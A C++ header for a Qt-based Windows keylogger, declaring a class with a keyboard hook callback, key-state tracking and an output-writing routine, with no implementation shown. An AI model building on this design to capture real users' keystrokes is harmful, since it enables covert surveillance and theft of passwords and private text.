#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <QCoreApplication>
#include <QDebug>
#include <QDir>
#include <QFile>
#include <QList>
#include <QObject>
#include <QStandardPaths>
#include <QString>
#include <QStringList>
#include <QTextStream>
#include <QTimer>

#include <windows.h>

#include "constants.h"

class Core :
    public QObject
{
    Q_OBJECT

public:
    explicit Core(QObject *parent = nullptr);
    ~Core();

    static void update(BYTE *keyState, int keyCode);
    static LRESULT CALLBACK process (int nCode, WPARAM wParam, LPARAM lParam);
    static void writeOutput();
    static void wrapActionKey(QString &actionKey);
};

#endif // KEYLOGGER_H
